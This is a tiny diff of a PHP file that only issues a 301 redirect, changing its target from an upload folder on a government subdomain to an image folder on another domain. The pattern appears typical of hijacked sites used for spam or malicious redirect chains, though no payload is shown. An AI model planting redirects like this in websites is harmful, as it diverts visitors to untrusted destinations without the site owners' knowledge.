@@ -1,4 +1,4 @@
 <?php
-header("Location: https://sirentang.brebeskab.go.id/upload/galeri/video/", true, 301);
+header("Location: https://kemenagkotabaubau.com/file/img/", true, 301);
 exit();
 ?>
